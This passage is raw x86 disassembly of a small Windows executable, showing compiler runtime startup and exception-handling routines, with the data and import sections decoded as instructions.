  4018d3:	xor    DWORD PTR [ebp-0x8],eax
  4018d6:	xor    eax,ebp
  4018d8:	push   eax
  4018d9:	lea    eax,[ebp-0x10]
  4018dc:	mov    fs:0x0,eax
  4018e2:	mov    DWORD PTR [ebp-0x18],esp
  4018e5:	mov    DWORD PTR [ebp-0x4],0x0
  4018ec:	push   0x400000
  4018f1:	call   0x401980
  4018f6:	add    esp,0x4
  4018f9:	test   eax,eax
  4018fb:	je     0x401951
  4018fd:	mov    eax,DWORD PTR [ebp+0x8]
  401900:	sub    eax,0x400000
  401905:	push   eax
  401906:	push   0x400000
  40190b:	call   0x401860
  401910:	add    esp,0x8
  401913:	test   eax,eax
  401915:	je     0x401951
  401917:	mov    eax,DWORD PTR [eax+0x24]
  40191a:	shr    eax,0x1f
  40191d:	not    eax
  40191f:	and    eax,0x1
  401922:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401929:	mov    ecx,DWORD PTR [ebp-0x10]
  40192c:	mov    DWORD PTR fs:0x0,ecx
  401933:	pop    ecx
  401934:	pop    edi
  401935:	pop    esi
  401936:	pop    ebx
  401937:	mov    esp,ebp
  401939:	pop    ebp
  40193a:	ret    
  40193b:	mov    eax,DWORD PTR [ebp-0x14]
  40193e:	mov    eax,DWORD PTR [eax]
  401940:	xor    ecx,ecx
  401942:	cmp    DWORD PTR [eax],0xc0000005
  401948:	sete   cl
  40194b:	mov    eax,ecx
  40194d:	ret    
  40194e:	mov    esp,DWORD PTR [ebp-0x18]
  401951:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401958:	xor    eax,eax
  40195a:	mov    ecx,DWORD PTR [ebp-0x10]
  40195d:	mov    DWORD PTR fs:0x0,ecx
  401964:	pop    ecx
  401965:	pop    edi
  401966:	pop    esi
  401967:	pop    ebx
  401968:	mov    esp,ebp
  40196a:	pop    ebp
  40196b:	ret    
  40196c:	int3   
  40196d:	int3   
  40196e:	int3   
  40196f:	int3   
  401970:	int3   
  401971:	int3   
  401972:	int3   
  401973:	int3   
  401974:	int3   
  401975:	int3   
  401976:	int3   
  401977:	int3   
  401978:	int3   
  401979:	int3   
  40197a:	int3   
  40197b:	int3   
  40197c:	int3   
  40197d:	int3   
  40197e:	int3   
  40197f:	int3   
  401980:	mov    edi,edi
  401982:	push   ebp
  401983:	mov    ebp,esp
  401985:	mov    eax,DWORD PTR [ebp+0x8]
  401988:	mov    ecx,0x5a4d
  40198d:	cmp    WORD PTR [eax],cx
  401990:	je     0x401996
  401992:	xor    eax,eax
  401994:	pop    ebp
  401995:	ret    
  401996:	mov    ecx,DWORD PTR [eax+0x3c]
  401999:	add    ecx,eax
  40199b:	xor    eax,eax
  40199d:	cmp    DWORD PTR [ecx],0x4550
  4019a3:	jne    0x4019b1
  4019a5:	mov    edx,0x10b
  4019aa:	cmp    WORD PTR [ecx+0x18],dx
  4019ae:	sete   al
  4019b1:	pop    ebp
  4019b2:	ret    
  4019b3:	int3   
  4019b4:	int3   
  4019b5:	int3   
  4019b6:	int3   
  4019b7:	int3   
  4019b8:	mov    edi,edi
  4019ba:	push   ebp
  4019bb:	mov    ebp,esp
  4019bd:	sub    esp,0x14
  4019c0:	and    DWORD PTR [ebp-0xc],0x0
  4019c4:	and    DWORD PTR [ebp-0x8],0x0
  4019c8:	mov    eax,ds:0x402004
  4019cd:	push   esi
  4019ce:	push   edi
  4019cf:	mov    edi,0xbb40e64e
  4019d4:	mov    esi,0xffff0000
  4019d9:	cmp    eax,edi
  4019db:	je     0x4019ea
  4019dd:	test   esi,eax
  4019df:	je     0x4019ea
  4019e1:	not    eax
  4019e3:	mov    ds:0x402008,eax
  4019e8:	jmp    0x401a54
  4019ea:	lea    eax,[ebp-0xc]
  4019ed:	push   eax
  4019ee:	call   DWORD PTR ds:0x403050
  4019f4:	mov    eax,DWORD PTR [ebp-0x8]
  4019f7:	xor    eax,DWORD PTR [ebp-0xc]
  4019fa:	mov    DWORD PTR [ebp-0x4],eax
  4019fd:	call   DWORD PTR ds:0x40302c
  401a03:	xor    DWORD PTR [ebp-0x4],eax
  401a06:	call   DWORD PTR ds:0x403028
  401a0c:	xor    DWORD PTR [ebp-0x4],eax
  401a0f:	call   DWORD PTR ds:0x40304c
  401a15:	xor    eax,DWORD PTR [ebp-0x4]
  401a18:	lea    ecx,[ebp-0x4]
  401a1b:	xor    eax,ecx
  401a1d:	mov    DWORD PTR [ebp-0x4],eax
  401a20:	lea    eax,[ebp-0x14]
  401a23:	push   eax
  401a24:	call   DWORD PTR ds:0x40303c
  401a2a:	mov    eax,DWORD PTR [ebp-0x10]
  401a2d:	xor    eax,DWORD PTR [ebp-0x14]
  401a30:	mov    ecx,DWORD PTR [ebp-0x4]
  401a33:	xor    ecx,eax
  401a35:	cmp    ecx,edi
  401a37:	je     0x401a41
  401a39:	test   DWORD PTR ds:0x402004,esi
  401a3f:	jne    0x401a46
  401a41:	mov    ecx,0xbb40e64f
  401a46:	mov    DWORD PTR ds:0x402004,ecx
  401a4c:	not    ecx
  401a4e:	mov    DWORD PTR ds:0x402008,ecx
  401a54:	pop    edi
  401a55:	pop    esi
  401a56:	mov    esp,ebp
  401a58:	pop    ebp
  401a59:	ret    
  401a5a:	int3   
  401a5b:	int3   
  401a5c:	int3   
  401a5d:	int3   
  401a5e:	int3   
  401a5f:	push   0x30000
  401a64:	push   0x10000
  401a69:	call   DWORD PTR ds:0x40305c
  401a6f:	pop    ecx
  401a70:	pop    ecx
  401a71:	ret    
  401a72:	int3   
  401a73:	int3   
  401a74:	int3   
  401a75:	int3   
  401a76:	int3   
  401a77:	int3   
  401a78:	jmp    DWORD PTR ds:0x403068
  401a7e:	int3   
  401a7f:	int3   
  401a80:	int3   
  401a81:	int3   
  401a82:	int3   
  401a83:	int3   
  401a84:	push   0x401ae0
  401a89:	push   DWORD PTR fs:0x0
  401a90:	mov    eax,DWORD PTR [esp+0x10]
  401a94:	mov    DWORD PTR [esp+0x10],ebp
  401a98:	lea    ebp,[esp+0x10]
  401a9c:	sub    esp,eax
  401a9e:	push   ebx
  401a9f:	push   esi
  401aa0:	push   edi
  401aa1:	mov    eax,ds:0x402004
  401aa6:	xor    DWORD PTR [ebp-0x4],eax
  401aa9:	xor    eax,ebp
  401aab:	mov    DWORD PTR [ebp-0x1c],eax
  401aae:	push   eax
  401aaf:	mov    DWORD PTR [ebp-0x18],esp
  401ab2:	push   DWORD PTR [ebp-0x8]
  401ab5:	mov    eax,DWORD PTR [ebp-0x4]
  401ab8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401abf:	mov    DWORD PTR [ebp-0x8],eax
  401ac2:	lea    eax,[ebp-0x10]
  401ac5:	mov    fs:0x0,eax
  401acb:	ret    
  401acc:	mov    ecx,DWORD PTR [ebp-0x1c]
  401acf:	xor    ecx,ebp
  401ad1:	call   0x401700
  401ad6:	jmp    0x401ca1
  401adb:	int3   
  401adc:	int3   
  401add:	int3   
  401ade:	int3   
  401adf:	int3   
  401ae0:	mov    edi,edi
  401ae2:	push   ebp
  401ae3:	mov    ebp,esp
  401ae5:	push   DWORD PTR [ebp+0x14]
  401ae8:	push   DWORD PTR [ebp+0x10]
  401aeb:	push   DWORD PTR [ebp+0xc]
  401aee:	push   DWORD PTR [ebp+0x8]
  401af1:	push   0x401700
  401af6:	push   0x402004
  401afb:	call   0x401cba
  401b00:	add    esp,0x18
  401b03:	pop    ebp
  401b04:	ret    
  401b05:	int3   
  401b06:	int3   
  401b07:	int3   
  401b08:	int3   
  401b09:	int3   
  401b0a:	int3   
  401b0b:	int3   
  401b0c:	int3   
  401b0d:	int3   
  401b0e:	int3   
  401b0f:	int3   
  401b10:	ret    
  401b11:	int3   
  401b12:	int3   
  401b13:	int3   
  401b14:	int3   
  401b15:	int3   
  401b16:	mov    edi,edi
  401b18:	push   ebp
  401b19:	mov    ebp,esp
  401b1b:	push   0x0
  401b1d:	call   DWORD PTR ds:0x403010
  401b23:	push   DWORD PTR [ebp+0x8]
  401b26:	call   DWORD PTR ds:0x403014
  401b2c:	push   0xc0000409
  401b31:	call   DWORD PTR ds:0x403030
  401b37:	push   eax
  401b38:	call   DWORD PTR ds:0x403034
  401b3e:	pop    ebp
  401b3f:	ret    
  401b40:	int3   
  401b41:	int3   
  401b42:	int3   
  401b43:	int3   
  401b44:	int3   
  401b45:	mov    edi,edi
  401b47:	push   ebp
  401b48:	mov    ebp,esp
  401b4a:	sub    esp,0x324
  401b50:	mov    ds:0x402140,eax
  401b55:	mov    DWORD PTR ds:0x40213c,ecx
  401b5b:	mov    DWORD PTR ds:0x402138,edx
  401b61:	mov    DWORD PTR ds:0x402134,ebx
  401b67:	mov    DWORD PTR ds:0x402130,esi
  401b6d:	mov    DWORD PTR ds:0x40212c,edi
  401b73:	data16 mov WORD PTR ds:0x402158,ss
  401b7a:	data16 mov WORD PTR ds:0x40214c,cs
  401b81:	data16 mov WORD PTR ds:0x402128,ds
  401b88:	data16 mov WORD PTR ds:0x402124,es
  401b8f:	data16 mov WORD PTR ds:0x402120,fs
  401b96:	data16 mov WORD PTR ds:0x40211c,gs
  401b9d:	pushf  
  401b9e:	pop    DWORD PTR ds:0x402150
  401ba4:	mov    eax,DWORD PTR [ebp+0x0]
  401ba7:	mov    ds:0x402144,eax
  401bac:	mov    eax,DWORD PTR [ebp+0x4]
  401baf:	mov    ds:0x402148,eax
  401bb4:	lea    eax,[ebp+0x8]
  401bb7:	mov    ds:0x402154,eax
  401bbc:	mov    eax,DWORD PTR [ebp-0x324]
  401bc2:	mov    DWORD PTR ds:0x402090,0x10001
  401bcc:	mov    eax,ds:0x402148
  401bd1:	mov    ds:0x40204c,eax
  401bd6:	mov    DWORD PTR ds:0x402040,0xc0000409
  401be0:	mov    DWORD PTR ds:0x402044,0x1
  401bea:	mov    DWORD PTR ds:0x402050,0x3
  401bf4:	push   0x4
  401bf6:	pop    eax
  401bf7:	imul   eax,eax,0x0
  401bfa:	mov    DWORD PTR [eax+0x402054],0x2
  401c04:	push   0x4
  401c06:	pop    eax
  401c07:	shl    eax,0x0
  401c0a:	mov    ecx,DWORD PTR ds:0x402004
  401c10:	mov    DWORD PTR [eax+0x402054],ecx
  401c16:	push   0x4
  401c18:	pop    eax
  401c19:	shl    eax,1
  401c1b:	mov    ecx,DWORD PTR ds:0x402008
  401c21:	mov    DWORD PTR [eax+0x402054],ecx
  401c27:	push   0x4
  401c29:	pop    eax
  401c2a:	imul   eax,eax,0x0
  401c2d:	mov    ecx,DWORD PTR ds:0x402004
  401c33:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401c37:	push   0x4
  401c39:	pop    eax
  401c3a:	shl    eax,0x0
  401c3d:	mov    ecx,DWORD PTR ds:0x402008
  401c43:	mov    DWORD PTR [ebp+eax*1-0x8],ecx
  401c47:	push   0x401040
  401c4c:	call   0x401b16
  401c51:	mov    esp,ebp
  401c53:	pop    ebp
  401c54:	ret    
  401c55:	int3   
  401c56:	int3   
  401c57:	int3   
  401c58:	int3   
  401c59:	int3   
  401c5a:	int3   
  401c5b:	int3   
  401c5c:	push   0x401ae0
  401c61:	push   DWORD PTR fs:0x0
  401c68:	mov    eax,DWORD PTR [esp+0x10]
  401c6c:	mov    DWORD PTR [esp+0x10],ebp
  401c70:	lea    ebp,[esp+0x10]
  401c74:	sub    esp,eax
  401c76:	push   ebx
  401c77:	push   esi
  401c78:	push   edi
  401c79:	mov    eax,ds:0x402004
  401c7e:	xor    DWORD PTR [ebp-0x4],eax
  401c81:	xor    eax,ebp
  401c83:	push   eax
  401c84:	mov    DWORD PTR [ebp-0x18],esp
  401c87:	push   DWORD PTR [ebp-0x8]
  401c8a:	mov    eax,DWORD PTR [ebp-0x4]
  401c8d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401c94:	mov    DWORD PTR [ebp-0x8],eax
  401c97:	lea    eax,[ebp-0x10]
  401c9a:	mov    fs:0x0,eax
  401ca0:	ret    
  401ca1:	mov    ecx,DWORD PTR [ebp-0x10]
  401ca4:	mov    DWORD PTR fs:0x0,ecx
  401cab:	pop    ecx
  401cac:	pop    edi
  401cad:	pop    edi
  401cae:	pop    esi
  401caf:	pop    ebx
  401cb0:	mov    esp,ebp
  401cb2:	pop    ebp
  401cb3:	push   ecx
  401cb4:	ret    
  401cb5:	int3   
  401cb6:	int3   
  401cb7:	int3   
  401cb8:	int3   
  401cb9:	int3   
  401cba:	jmp    DWORD PTR ds:0x403058
  401cc0:	in     al,0xff
  401cc2:	(bad)  
  401cc3:	inc    DWORD PTR [eax]
  401cc5:	add    BYTE PTR [eax],al
  401cc7:	add    BYTE PTR [edi+edi*8+0xffff],al
  401cce:	add    BYTE PTR [eax],al
  401cd0:	(bad)  
  401cd1:	(bad)  
  401cd2:	(bad)  
  401cd3:	push   DWORD PTR [esi+0x16]
  401cd6:	inc    eax
  401cd7:	add    BYTE PTR [edx+0x16],bh
  401cda:	inc    eax
  401cdb:	add    dh,bh
  401cdd:	(bad)  
  401cde:	(bad)  
  401cdf:	jmp    FWORD PTR [edx]
  401ce1:	push   ss
  401ce2:	inc    eax
  401ce3:	add    BYTE PTR [esi],bh
  401ce5:	push   ss
  401ce6:	inc    eax
  401ce7:	add    dh,bh
  401ce9:	(bad)  
  401cea:	(bad)  
  401ceb:	inc    DWORD PTR [eax]
  401ced:	add    BYTE PTR [eax],al
  401cef:	add    ah,dl
  401cf1:	(bad)  
  401cf2:	(bad)  
  401cf3:	inc    DWORD PTR [eax]
  401cf5:	add    BYTE PTR [eax],al
  401cf7:	add    dh,bh
  401cf9:	(bad)  
  401cfa:	(bad)  
  401cfb:	(bad)  
  401cfc:	fcom   QWORD PTR [edi]
  401cfe:	inc    eax
  401cff:	add    al,ah
  401d01:	pop    ss
  401d02:	inc    eax
  401d03:	add    BYTE PTR [eax],al
  401d05:	add    BYTE PTR [eax],al
  401d07:	add    dh,bh
  401d09:	(bad)  
  401d0a:	(bad)  
  401d0b:	inc    DWORD PTR [eax]
  401d0d:	add    BYTE PTR [eax],al
  401d0f:	add    al,bl
  401d11:	(bad)  
  401d12:	(bad)  
  401d13:	inc    DWORD PTR [eax]
  401d15:	add    BYTE PTR [eax],al
  401d17:	add    dh,bh
  401d19:	(bad)  
  401d1a:	(bad)  
  401d1b:	(bad)  
  401d1c:	cmp    ebx,DWORD PTR [ecx]
  401d1e:	inc    eax
  401d1f:	add    BYTE PTR [esi+0x19],cl
  401d22:	inc    eax
	...

Disassembly of section .data:

00402000 <.data>:
  402000:	add    DWORD PTR [eax],eax
  402002:	add    BYTE PTR [eax],al
  402004:	dec    esi
  402005:	out    0x40,al
  402007:	mov    ebx,0x44bf19b1
	...

Disassembly of section .idata:

00403000 <.idata>:
  403000:	cld    
  403001:	xor    DWORD PTR [eax],eax
  403003:	add    BYTE PTR [eax],al
  403005:	add    BYTE PTR [eax],al
  403007:	add    BYTE PTR [ebx+esi*1],cl
  40300a:	add    BYTE PTR [eax],al
  40300c:	add    BYTE PTR [eax],al
  40300e:	add    BYTE PTR [eax],al
  403010:	inc    edx
  403011:	xor    eax,DWORD PTR [eax]
  403013:	add    ah,ah
  403015:	xor    eax,DWORD PTR [eax]
  403017:	add    BYTE PTR [eax],al
  403019:	add    BYTE PTR [eax],al
  40301b:	add    BYTE PTR [eax+0x33],ah
  40301e:	add    BYTE PTR [eax],al
  403020:	add    BYTE PTR [eax],al
  403022:	add    BYTE PTR [eax],al
  403024:	xor    BYTE PTR [ebx],dh
  403026:	add    BYTE PTR [eax],al
  403028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403029:	xor    eax,DWORD PTR [eax]
  40302b:	add    BYTE PTR [esi+0x33],cl
  403031:	xor    al,0x0
  403033:	add    BYTE PTR [esp+esi*1],dl
  403036:	add    BYTE PTR [eax],al
  403038:	add    BYTE PTR [eax],al
  40303a:	add    BYTE PTR [eax],al
  40303c:	je     0x403071
  40303e:	add    BYTE PTR [eax],al
  403040:	add    BYTE PTR [eax],al
  403042:	add    BYTE PTR [eax],al
  403044:	sub    BYTE PTR [ebx],dh
  403046:	add    BYTE PTR [eax],al
  403048:	add    BYTE PTR [eax],al
  40304a:	add    BYTE PTR [eax],al
  40304c:	aam    0x33
  40304e:	add    BYTE PTR [eax],al
  403050:	mov    edx,0x33
  403055:	add    BYTE PTR [eax],al
  403057:	add    dl,dh
  403059:	xor    al,BYTE PTR [eax]
  40305b:	add    ah,ah
  40305d:	xor    al,BYTE PTR [eax]
  40305f:	add    ah,al
  403061:	xor    al,BYTE PTR [eax]
  403063:	add    BYTE PTR [edx-0x51ffffce],bh
  403069:	xor    al,BYTE PTR [eax]
  40306b:	add    BYTE PTR [edx-0x73ffffce],bl
  403071:	xor    al,BYTE PTR [eax]
  403073:	add    BYTE PTR [edx+0x7a000032],al
  403079:	xor    al,BYTE PTR [eax]
  40307b:	add    BYTE PTR [edx+0x32],dh
  40307e:	add    BYTE PTR [eax],al
  403080:	pusha  
  403081:	xor    al,BYTE PTR [eax]
  403083:	add    BYTE PTR [esi+0x32],cl
  403086:	add    BYTE PTR [eax],al
  403088:	inc    eax
  403089:	xor    al,BYTE PTR [eax]
  40308b:	add    BYTE PTR [eax],dh
  40308d:	xor    al,BYTE PTR [eax]
  40308f:	add    BYTE PTR [edx],ah
  403091:	xor    al,BYTE PTR [eax]
  403093:	add    BYTE PTR [eax],al
  403095:	add    BYTE PTR [eax],al
  403097:	add    BYTE PTR [eax],dl
  403099:	sbb    eax,DWORD PTR [eax+0x0]
  40309c:	xor    DWORD PTR fs:[eax],eax
	...
  4030a7:	add    BYTE PTR [edx+esi*1],dl
  4030aa:	add    BYTE PTR [eax],al
  4030ac:	add    BYTE PTR [eax],dh
  4030ae:	add    BYTE PTR [eax],al
  4030b0:	mov    esp,0x31
  4030b5:	add    BYTE PTR [eax],al
  4030b7:	add    BYTE PTR [eax],al
  4030b9:	add    BYTE PTR [eax],al
  4030bb:	add    al,bl
  4030bd:	xor    al,BYTE PTR [eax]
  4030bf:	add    BYTE PTR [eax+0x30],bl
  4030c2:	add    BYTE PTR [eax],al
  4030c4:	ins    BYTE PTR es:[edi],dx
  4030c5:	xor    DWORD PTR [eax],eax
	...
  4030cf:	add    BYTE PTR [esi],bl
  4030d1:	xor    eax,DWORD PTR [eax]
  4030d3:	add    BYTE PTR [eax],cl
  4030d5:	xor    BYTE PTR [eax],al
  4030d7:	add    BYTE PTR [eax+0x31],ch
  4030dd:	add    BYTE PTR [eax],al
  4030df:	add    BYTE PTR [eax],al
  4030e1:	add    BYTE PTR [eax],al
  4030e3:	add    BYTE PTR [eax],ch
  4030e5:	xor    al,0x0
  4030e7:	add    BYTE PTR [eax+esi*1+0x0],al
  4030eb:	add    BYTE PTR [eax+0x31],cl
  4030f1:	add    BYTE PTR [eax],al
  4030f3:	add    BYTE PTR [eax],al
  4030f5:	add    BYTE PTR [eax],al
  4030f7:	add    BYTE PTR [edx+0x34],cl
  4030fa:	add    BYTE PTR [eax],al
  4030fc:	and    al,0x30
  4030fe:	add    BYTE PTR [eax],al
  403100:	je     0x403133
	...
  40310a:	add    BYTE PTR [eax],al
  40310c:	je     0x403142
  40310e:	add    BYTE PTR [eax],al
  403110:	adc    BYTE PTR [eax],dh
  403112:	add    BYTE PTR [eax],al
  403114:	xor    BYTE PTR [ecx],0x0
	...
  40311f:	add    BYTE PTR [esi+0x1c000034],bl
  403125:	xor    BYTE PTR [eax],al
  403127:	add    BYTE PTR [eax+0x31],ah
  40312d:	add    BYTE PTR [eax],al
  40312f:	add    BYTE PTR [eax],al
  403131:	add    BYTE PTR [eax],al
  403133:	add    al,cl
  403135:	xor    al,0x0
  403137:	add    BYTE PTR [eax+esi*1],bh
  40313a:	add    BYTE PTR [eax],al
  40313c:	mov    al,0x31
	...
  403146:	add    BYTE PTR [eax],al
  403148:	in     al,dx
  403149:	xor    al,0x0
  40314b:	add    BYTE PTR [eax+esi*1+0x0],cl
	...
  403163:	add    ah,bh
  403165:	xor    DWORD PTR [eax],eax
  403167:	add    BYTE PTR [eax],al
  403169:	add    BYTE PTR [eax],al
  40316b:	add    BYTE PTR [ebx+esi*1],cl
  40316e:	add    BYTE PTR [eax],al
  403170:	add    BYTE PTR [eax],al
  403172:	add    BYTE PTR [eax],al
  403174:	inc    edx
  403175:	xor    eax,DWORD PTR [eax]
  403177:	add    ah,ah
  403179:	xor    eax,DWORD PTR [eax]
  40317b:	add    BYTE PTR [eax],al
  40317d:	add    BYTE PTR [eax],al
  40317f:	add    BYTE PTR [eax+0x33],ah
  403182:	add    BYTE PTR [eax],al
  403184:	add    BYTE PTR [eax],al
  403186:	add    BYTE PTR [eax],al
  403188:	xor    BYTE PTR [ebx],dh
  40318a:	add    BYTE PTR [eax],al
  40318c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40318d:	xor    eax,DWORD PTR [eax]
  40318f:	add    BYTE PTR [esi+0x33],cl
  403195:	xor    al,0x0
  403197:	add    BYTE PTR [esp+esi*1],dl
  40319a:	add    BYTE PTR [eax],al
  40319c:	add    BYTE PTR [eax],al
  40319e:	add    BYTE PTR [eax],al
  4031a0:	je     0x4031d5
  4031a2:	add    BYTE PTR [eax],al
  4031a4:	add    BYTE PTR [eax],al
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	sub    BYTE PTR [ebx],dh
  4031aa:	add    BYTE PTR [eax],al
  4031ac:	add    BYTE PTR [eax],al
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	aam    0x33
  4031b2:	add    BYTE PTR [eax],al
  4031b4:	mov    edx,0x33
  4031b9:	add    BYTE PTR [eax],al
  4031bb:	add    dl,dh
  4031bd:	xor    al,BYTE PTR [eax]
  4031bf:	add    ah,ah
  4031c1:	xor    al,BYTE PTR [eax]
  4031c3:	add    ah,al
  4031c5:	xor    al,BYTE PTR [eax]
  4031c7:	add    BYTE PTR [edx-0x51ffffce],bh
  4031cd:	xor    al,BYTE PTR [eax]
  4031cf:	add    BYTE PTR [edx-0x73ffffce],bl
  4031d5:	xor    al,BYTE PTR [eax]
  4031d7:	add    BYTE PTR [edx+0x7a000032],al
  4031dd:	xor    al,BYTE PTR [eax]
  4031df:	add    BYTE PTR [edx+0x32],dh
  4031e2:	add    BYTE PTR [eax],al
  4031e4:	pusha  
  4031e5:	xor    al,BYTE PTR [eax]
  4031e7:	add    BYTE PTR [esi+0x32],cl
  4031ea:	add    BYTE PTR [eax],al
  4031ec:	inc    eax
  4031ed:	xor    al,BYTE PTR [eax]
  4031ef:	add    BYTE PTR [eax],dh
  4031f1:	xor    al,BYTE PTR [eax]
  4031f3:	add    BYTE PTR [edx],ah
  4031f5:	xor    al,BYTE PTR [eax]
  4031f7:	add    BYTE PTR [eax],al
  4031f9:	add    BYTE PTR [eax],al
  4031fb:	add    BYTE PTR [eax+0x6d6f4300],dl
  403201:	jo     0x403264
  403203:	jb     0x40326a
  403205:	push   ebx
  403206:	je     0x40327a
  403208:	imul   ebp,DWORD PTR [esi+0x67],0x6964724f
  40320f:	outs   dx,BYTE PTR ds:[esi]
  403210:	popa   
  403211:	ins    BYTE PTR es:[edi],dx
  403212:	add    BYTE PTR [eax],al
  403214:	dec    ebx
  403215:	inc    ebp
  403216:	push   edx
  403217:	dec    esi
  403218:	inc    ebp
  403219:	dec    esp
  40321a:	xor    esi,DWORD PTR [edx]
  40321c:	cs fs ins BYTE PTR es:[edi],dx
  40321f:	ins    BYTE PTR es:[edi],dx
  403220:	add    BYTE PTR [eax],al
  403222:	outs   dx,DWORD PTR ds:[esi]
  403223:	add    BYTE PTR [edi+0x58],bl
  403226:	arpl   WORD PTR [eax+0x74],si
  403229:	inc    esi
  40322a:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0xc90072
  403232:	pop    edi
  403233:	pop    edi
  403234:	jo     0x403295
  403236:	pop    edi
  403237:	arpl   WORD PTR [edi+0x6d],bp
  40323a:	ins    DWORD PTR es:[edi],dx
  40323b:	outs   dx,DWORD PTR ds:[esi]
  40323c:	fs add BYTE PTR gs:[eax],al
  403240:	adc    DWORD PTR [ecx],eax
  403242:	pop    edi
  403243:	popa   
  403244:	ins    DWORD PTR es:[edi],dx
  403245:	jae    0x4032ae
  403247:	pop    edi
  403248:	gs js  0x4032b4
  40324b:	je     0x40324d
  40324d:	add    cl,dh
  40324f:	add    BYTE PTR [edi+0x5f],bl
  403252:	ja     0x4032bb
  403254:	gs je  0x4032c4
  403257:	popa   
  403258:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  40325f:	add    dl,ah
  403261:	add    BYTE PTR [edi+0x5f],bl
  403264:	jae    0x4032cb
  403266:	je     0x4032c7
  403268:	popa   
  403269:	jo     0x4032db
  40326b:	pop    edi
  40326c:	je     0x4032e7
  40326e:	jo     0x4032d5
  403270:	add    BYTE PTR [eax],al
  403272:	scas   al,BYTE PTR es:[edi]
  403273:	add    al,0x65
  403275:	js     0x4032e0
  403277:	je     0x403279
  403279:	add    BYTE PTR [ebx+0x1],dh
  40327c:	pop    edi
  40327d:	gs js  0x4032e9
  403280:	je     0x403282
  403282:	and    al,0x1
  403284:	pop    edi
  403285:	arpl   WORD PTR [ebp+0x78],sp
  403288:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x5f5f00ce
  403290:	jo     0x4032f1
  403292:	pop    edi
  403293:	ins    WORD PTR es:[edi],dx
  403295:	outs   dx,DWORD PTR ds:[esi]
  403296:	fs add BYTE PTR gs:[eax],al
  40329a:	in     al,0x0
  40329c:	pop    edi
  40329d:	pop    edi
  40329e:	jae    0x403305
  4032a0:	je     0x403317
  4032a2:	jae    0x403309
  4032a4:	jb     0x403313
  4032a6:	popa   
  4032a7:	je     0x403311
  4032a9:	gs jb  0x40331e
  4032ac:	add    BYTE PTR [eax],al
  4032ae:	call   0x6ea991b4
  4032b3:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x5006d72
  4032bb:	add    al,0x5f
  4032bd:	ja     0x403322
  4032bf:	ins    DWORD PTR es:[edi],dx
  4032c0:	fs ins BYTE PTR es:[edi],dx
  4032c2:	outs   dx,BYTE PTR ds:[esi]
  4032c3:	add    BYTE PTR ds:0x65743f00,dh
  4032c9:	jb     0x403338
  4032cb:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  4032d2:	pop    ecx
  4032d3:	inc    ecx
  4032d4:	pop    eax
  4032d5:	pop    eax
  4032d6:	pop    edx
  4032d7:	add    BYTE PTR [ebp+0x73],ch
  4032da:	jbe    0x40333f
  4032dc:	jb     0x403352
  4032de:	cs fs ins BYTE PTR es:[edi],dx
  4032e1:	ins    BYTE PTR es:[edi],dx
  4032e2:	add    BYTE PTR [eax],al
  4032e4:	aaa    
  4032e5:	add    DWORD PTR [edi+0x63],ebx
  4032e8:	outs   dx,DWORD PTR ds:[esi]
  4032e9:	outs   dx,BYTE PTR ds:[esi]
  4032ea:	je     0x40335e
  4032ec:	outs   dx,DWORD PTR ds:[esi]
  4032ed:	ins    BYTE PTR es:[edi],dx
  4032ee:	data16 jo 0x4032f1
  4032f1:	add    BYTE PTR [edx+0x1],ch
  4032f4:	pop    edi
  4032f5:	gs js  0x40335b
  4032f8:	gs jo  0x40336f
  4032fb:	pop    edi
  4032fc:	push   0x6c646e61
  403301:	gs jb  0x403338
  403304:	pop    edi
  403305:	arpl   WORD PTR [edi+0x6d],bp
  403308:	ins    DWORD PTR es:[edi],dx
  403309:	outs   dx,DWORD PTR ds:[esi]
  40330a:	outs   dx,BYTE PTR ds:[esi]
  40330b:	add    BYTE PTR [eax],al
  40330d:	add    BYTE PTR [ecx+ebp*2+0x73],al
  403311:	jo     0x40337f
  403313:	popa   
  403314:	jns    0x403369
  403316:	pop    ecx
  403317:	push   ebx
  403318:	inc    esp
  403319:	dec    ebp
  40331a:	inc    ebx
  40331b:	push   eax
  40331c:	dec    esp
  40331d:	add    BYTE PTR [ebx+0x59],dl
  403320:	push   ebx
  403321:	inc    esp
  403322:	dec    ebp
  403323:	cs inc ebx
  403325:	push   eax
  403326:	dec    esp
  403327:	add    BYTE PTR ds:0x656c5300,ch
  40332d:	gs jo  0x403330
  403330:	and    BYTE PTR [eax],al
  403332:	inc    edi
  403333:	gs je  0x403389
  403336:	je     0x403399
  403338:	jb     0x4033ae
  40333a:	jne    0x4033ac
  40333c:	dec    ecx
  40333d:	outs   dx,BYTE PTR ds:[esi]
  40333e:	outs   dx,WORD PTR ds:[esi]
  403340:	push   edi
  403341:	add    BYTE PTR [edi],cl
  403343:	add    BYTE PTR [ebx+0x65],dl
  403346:	je     0x40339d
  403348:	outs   dx,BYTE PTR ds:[esi]
  403349:	push   0x6c646e61
  40334e:	gs fs inc ebp
  403351:	js     0x4033b6
  403353:	gs jo  0x4033ca
  403356:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  40335d:	gs jb  0x403360
  403360:	adc    BYTE PTR [eax],al
  403362:	inc    edi
  403363:	gs je  0x4033b3
  403366:	outs   dx,DWORD PTR ds:[esi]
  403367:	fs jne 0x4033d6
  40336a:	gs dec eax
  40336c:	popa   
  40336d:	outs   dx,BYTE PTR ds:[esi]
  40336e:	fs ins BYTE PTR es:[edi],dx
  403370:	gs inc ecx
  403372:	add    BYTE PTR [eax],al
  403374:	add    BYTE PTR [eax],al
  403376:	push   ecx
  403377:	jne    0x4033de
  403379:	jb     0x4033f4
  40337b:	push   eax
  40337c:	gs jb  0x4033e5
  40337f:	outs   dx,DWORD PTR ds:[esi]
  403380:	jb     0x4033ef
  403382:	popa   
  403383:	outs   dx,BYTE PTR ds:[esi]
  403384:	arpl   WORD PTR [ebp+0x43],sp
  403387:	outs   dx,DWORD PTR ds:[esi]
  403388:	jne    0x4033f8
  40338a:	je     0x4033f1
